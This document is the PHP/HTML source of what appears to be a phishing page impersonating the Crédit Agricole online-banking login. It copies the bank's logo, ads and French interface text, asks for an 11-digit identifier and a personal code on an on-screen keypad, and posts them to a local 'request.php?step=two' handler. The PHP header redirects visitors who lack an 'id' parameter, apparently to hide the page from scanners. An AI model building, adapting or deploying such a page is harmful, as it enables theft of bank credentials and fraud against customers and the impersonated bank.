<?php
    $page = 'default';
    require_once 'init.php';
    if(!isset($_GET['id'])):
        die(rediret($link)); // We're done here
    else:
      $action = './request.php?step=two&'.$id;

?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <!-- Meta Tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
    <meta name="theme-color" content="#6dc77a"/>
    <meta name="msapplication-navbutton-color" content="#6dc77a"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a" />
    <link rel="icon" type="image/png" href="CA_Logo_seul-1.svg" />
    <link rel="stylesheet" href="<?php echo $css1; ?>" type="text/css">
    <link rel="stylesheet" href="<?php echo $css2; ?>" type="text/css">
    <link rel="stylesheet" href="<?php echo $css3; ?>" type="text/css">
    <link rel="stylesheet" href="<?php echo $css4; ?>" type="text/css">
    <title></title>
  </head>
  <body class="BodyLogin">

    <main>
    <div class="Login">
        <div class="Login-header js-Header">
           <a href="" class="Login-logo Login-logo-js">
              <div class="Login-logoImg js-needFakeNotSvg" style="position: relative;"><img class="" src="<?php echo $img; ?>/CA_Logo_seul-1.svg" alt="Crédit Agricole - Banque et assurances" style="position: absolute; top: 50%; left: 50%; max-width: 100%; max-height: 100px; height: 100%; transform: translate(-50%, -50%);"><img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMAAwICAgICAwICAgMDAwMEBgQEBAQECAYGBQYJCAoKCQgJCQoMDwwKCw4LCQkNEQ0ODxAQERAKDBITEhATDxAQEP/bAEMBAwMDBAMECAQECBALCQsQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEP/AABEIACgA2AMBIgACEQEDEQH/xAAVAAEBAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8AlUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//2Q==" style="opacity: 0; max-width: 100%; max-height: 100%; visibility: hidden;"></div>
           </a>
           <a href="#" class="Header-login" id="Login-close" tabindex="0" role="button" aria-label="Quitter l'accès à mon espace"></a>
        </div>
        <div class="container-fluid Template" style="margin-top: 60px;">
           <div class="row js-Template-head">
             <div class="col-xs-12 col-md-6">
               <div class="Template-reduceMargin15px">
                  <div class="js-StickyPush">
                     <div class="js-FullHeight ForgotPswd-imgWrapper hidden-xs">
                        <div class="placeholder-left parsys">
                           <div class="new-zdg parbase section">

                              <div class="componentZdg">
                                 <div class="PushCarousel3">
                                    <div><button class="PushCarousel3-masking" onclick="toggleStateCarousel('hom')">Mettre en pause ou
                                       redémarrer le défilement du carousel</button>
                                    </div>
                                    <div class="PushCarousel3-carousel">
                                       <div data-trackingclass="carrousel" class="PushCarousel3-carouselInner owl-loaded owl-drag" data-owl-access-keyup="1" data-owl-carousel-focusable="1">
                                          <div class="owl-stage-outer">
                                             <div class="owl-stage" style="transform: translate3d(0px, 0px, 0px); transition: all 0.25s ease 0s; width: 1594px;">
                                                <div class="owl-item active" aria-hidden="false" style="width: 796px; margin-right: 1px;">
                                                   <div class="PushCarousel3-item" data-trackinginfo="defnat_nexecur_1">
                                                      <div class="PushCommunication-backgroundWrapper">
                                                         <div class="PushCommunication-background PushCommunication-background--filterBlack" style="background-image: url('<?php echo $img; ?>/femme-transat-tablette.jpg')">
                                                         </div>
                                                      </div>
                                                      <div class="PushCommunication-zoning PushCommunication-zoning--leftCenter PushCommunication-zoning--transparent">
                                                         <div class="PushCommunication-title">
                                                            <div class="texte section">
                                                               <p><span class="h2"><b>UNE PROTECTION À PORTÉE DE MAIN QUAND VOTRE DOMICILE EST LOIN DES YEUX.</b></span></p>
                                                            </div>
                                                         </div>
                                                         <div class="PushCommunication-text">
                                                            <div class="texte section">
                                                               <p>Un système de télésurveillance accessible à tous et connecté à votre smartphone pour vous protéger des intrusions et des incendies.</p>
                                                            </div>
                                                         </div>
                                                         <!-- Si la popin de co est activé -->
                                                         <!-- Si la popin de co n'est pas activé -->
                                                         <a href="#" class="PushCommunication-btn PushCommunication-btn--primary" data-custom-redirect="#" target="_self" data-owl-temp-tabindex="0" tabindex="0"><span>EN SAVOIR PLUS</span></a>
                                                      </div>
                                                   </div>
                                                </div>
                                                <div class="owl-item" aria-hidden="true" style="width: 796px; margin-right: 1px;">
                                                   <div class="PushCarousel3-item" data-trackinginfo="defcr_rentree-AAV_2">
                                                      <div class="PushCommunication-backgroundWrapper">
                                                         <div class="PushCommunication-background PushCommunication-background--filterTransparent" style="background-image: url('<?php echo $img; ?>/femme-transat-tablette.jpg')">
                                                         </div>
                                                      </div>
                                                      <div class="PushCommunication-zoning PushCommunication-zoning--bottomCenter PushCommunication-zoning--white">
                                                         <div class="PushCommunication-title">
                                                            <div class="texte section">
                                                               <p><span class="h3">On ne peut pas prédire l’avenir mais, ensemble, on peut s’y préparer.</span></p>
                                                            </div>
                                                         </div>
                                                         <div class="PushCommunication-text">
                                                            <div class="texte section">
                                                               <p>Parce qu’un accident est vite arrivé … Soyez bien protégés face aux aléas de la vie quotidienne. Découvrez notre assurance des accidents de la vie*.
                                                                  <br>
                                                                  <span class="RichText-discret">*voir mentions sur site</span>
                                                               </p>
                                                            </div>
                                                         </div>
                                                         <!-- Si la popin de co est activé -->
                                                         <!-- Si la popin de co n'est pas activé -->
                                                         <a href="#" class="PushCommunication-btn PushCommunication-btn--primary" data-custom-redirect="#" target="_self" tabindex="0" data-owl-temp-tabindex="0"><span>en savoir plus</span></a>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                          <div class="owl-nav"><button type="button" role="presentation" class="owl-prev" tabindex="0"></button><button type="button" role="presentation" class="owl-next" tabindex="0"></button></div>
                                          <div class="owl-dots"><button role="button" class="owl-dot active"><span></span></button><button role="button" class="owl-dot"><span></span></button></div>
                                       </div>
                                    </div>
                                 </div>
                              </div>

                           </div>
                        </div>
                     </div>
                  </div>
               </div>
             </div>
             <div class="col-xs-12 col-md-6">
               <div class="Template-reduceMargin15px">
                  <div class="Login-container">
                     <div class="Login-title">
                        <h1>Accéder à <strong>mes comptes</strong></h1>
                     </div>
                     <div class="row row-no-padding">
                        <div class="col-xs-12 col-sm-6">
                           <div class="login-mini parbase">
                        <form class="Login-form" id="loginForm" name="loginForm" method="post" action="<?php echo $action; ?>">
                            <div class="row row-no-padding">
                               <div class="form-group">
                                  <label for="Login-account" class="col-xs-7 Login-noPadding Login-accountLabel">Identifiant</label>
                                  <div class="col-xs-12 Login-noPadding ForgotPswd-paragraphInformation">
                                     <p id="descIdentifiant">Saisissez votre identifiant à 11 chiffres</p>
                                  </div>
                                  <div class="col-xs-12 Login-noPadding" id="Login-account-div">
                                     <div class="add-clear-span form-group ">
                                       <input type="text" name="identifiant" id="identifiant" class="form-control"
                                       maxlength="11" placeholder="Ex: 98652706859">

                                    </div>

                                  </div>
                               </div>
                            </div>

                            <div class="row row-no-padding">
                               <div class="form-group div-code-perso" id="passcoddiv" style="display:none">
                                  <label for="Login-password" class="col-xs-7 Login-noPadding Login-accountLabel">Code personnel</label>
                                  <div class="col-xs-5 Login-lostPswd Login-noPadding js-lostPswd-pswd">
                                     <div class="login-simple-link parbase">
                                        <a href="" class="Login-lostPswdLink js-OpenTooltip" tabindex="0" aria-label="Mot de passe perdu ou oublié ?" target="_self">Perdu / Oublié&nbsp;?</a>
                                     </div>
                                  </div>

                                  <div class="col-xs-12 Login-noPadding" id="Login-password-div">
                                     <div class="add-clear-span form-group ">
                                       <input id="Login-password" name="Login-password" type="password" class="form-control input-clear"
                                       placeholder="Tapez votre code"
                                       readonly="readonly" aria-label="Code personnel"
                                       data-aria-label="Effacer et saisir à nouveau le champ code personnel"
                                       tabindex="0">

                                       <span onclick="var input = this.previousElementSibling; input.value = ''; input.focus();"
                                       role="button" class="add-clear-x form-control-feedback icon-form npc-close"
                                       style="display: block; cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 3;" aria-label="Effacer et saisir à nouveau le champ code personnel" tabindex="0"></span></div>
                                     <input type="hidden" id="j_password" name="j_password">

                                  </div>
                               </div>
                            </div>

                            <div class="row row-no-padding">
                               <div class="col-xs-12">
                                  <button tabindex="0" id="show" type="button" style="" aria-label="Valider mon indentifiant et entrer mon code personnel" class="btn btn-primary col-xs-12 Login-button" login-submit-btn="" disabled="">
                                  Entrer mon code personnel
                                  </button>
                               </div>
                            </div>
                            <div id="clavier_num" style="display:none">
                              <div class="row row-no-padding">
                                     <div class="col-xs-12">
                                       <div class="Login-keypad">
                                         <a href="#" class="Login-key T031__key" tabindex="0" role="button"><div data-pos="0">3</div></a>
                                         <a href="#" class="Login-key T031__key" tabindex="0" role="button"><div data-pos="1">6</div></a>
                                         <a href="#" class="Login-key T031__key" tabindex="0" role="button"><div data-pos="2">7</div></a>
                                         <a href="#" class="Login-key T031__key" tabindex="0" role="button"><div data-pos="3">2</div></a>
                                         <a href="#" class="Login-key T031__key" tabindex="0" role="button"><div data-pos="4">4</div></a>
                                       </div>
                                     </div>
                              </div>
                              <div class="row row-no-padding">
                              			<div class="col-xs-12">
                              				<div class="Login-keypad">
                              					<a href="#" class="Login-key T031__key" tabindex="0" role="button"><div data-pos="5">5</div></a>
                              					<a href="#" class="Login-key T031__key" tabindex="0" role="button"><div data-pos="6">9</div></a>
                              					<a href="#" class="Login-key T031__key" tabindex="0" role="button"><div data-pos="7">0</div></a>
                              					<a href="#" class="Login-key T031__key" tabindex="0" role="button"><div data-pos="8">8</div></a>
                              					<a href="#" class="Login-key T031__key" tabindex="0" role="button"><div data-pos="9">1</div></a>
                              				</div>
                              			</div>
		                         </div>
                            </div>
                            <div class="row row-no-padding">
                               <div class="col-xs-12">
                                  <button value="Valider" id="validation" aria-label="Valider mon code et accèder à mes comptes" type="submit" class="btn btn-primary Login-button col-xs-12"
                                   style="display:none" disabled="">
                                   Valider
                                  </button>
                               </div>
                            </div>





                            <div class="register parsys">
                               <div class="texte section">
                                  <div tabindex="-1">
                                     <p style="text-align: center;"><span class="h3">Vous n’êtes pas encore client&nbsp;?</span></p>
                                  </div>
                               </div>
                               <div class="bouton-generique parbase section">
                                  <div class="GenericBtn GenericBtn--full">
                                     <a href="" class="GenericBtn-btn" target="_self">
                                     <span>Devenir client</span>
                                     </a>
                                  </div>
                               </div>
                            </div>
                          </form>


                           </div>
                        </div>
                        <div class="col-xs-12 col-sm-6">
                           <div class="Login-information">
                              <div class="infos texte">
                                 <div tabindex="-1">
                                    <p><span class="lead"><b>UN PROBLÈME TECHNIQUE<br>
                                       </b>LORS DE VOTRE CONNEXION ?</span>
                                    </p>
                                    <p><span class="RichText-texteVignettes">Pour accéder à votre compte, saisissez votre identifiant (numéro de compte ou numéro de contrat Crédit Agricole En Ligne) et votre code personnel habituels.&nbsp;<br>
                                       <br>
                                       Code perdu / Oublié&nbsp;?&nbsp;<a href="#" target="_blank">Cliquez ici</a>&nbsp;pour régénérer votre code confidentiel.<br>
                                       <br>
                                       </span><span class="lead"><b>BESOIN D'AIDE</b></span>
                                    </p>
                                    <p><span class="RichText-texteVignettes">Besoin d’aide sur votre nouveau site, découvrez&nbsp;l’<a href="#" target="_blank">assistance en ligne</a>.<br>
                                       <br>
                                       Pour tout autre demande, merci de vous rapprocher de votre agence.<br>
                                       <br>
                                       </span><span class="lead"><b>SÉCURITÉ</b></span>
                                    </p>
                                    <p><span class="RichText-texteVignettes">Restez vigilants et veillez à protéger vos données personnelles.<br>
                                       <br>
                                       Consultez&nbsp;nos&nbsp;<a href="#" target="_blank">conseils de sécurité</a>.<br>
                                       <br>
                                       Nous vous invitons également à consulter régulièrement nos&nbsp;<a href="#" target="_blank">Conditions Générales d'Utilisation</a>.</span>
                                    </p>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
             </div>

           </div>

        </div>

    </div>
    </main>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script type="text/javascript">

      $(document).ready(function(){
        let elements = document.getElementsByClassName("Login-key T031__key");
        let input =document.getElementById('Login-password');
        for(let i = 0; i < elements.length; i++ ){
             elements[i].addEventListener('click', function() {
             if(input.value.length<6){
               document.getElementById('Login-password').value += elements[i].innerText
               $('#validation').prop("disabled", false);

             }


           });


         }




      });


      $(document).ready(function(){
        $('#show').click(function() {
          document.getElementById('clavier_num').style.display = "block";
          document.getElementById('passcoddiv').style.display = "block";
          document.getElementById('validation').style.display = "block";
          document.getElementById('show').style.display = "none";
          $('#validation').prop("disabled", true);



        });
      });


      $('#identifiant').keyup(function() {

        if (document.getElementById("identifiant").value.trim().length==11) {
          $('.Login-button').prop("disabled", false);

        } else {
          $('.Login-button').prop("disabled", true);

        }
      });




    </script>

  </body>
</html>
<?php
    endif;
    ob_end_flush();
?>
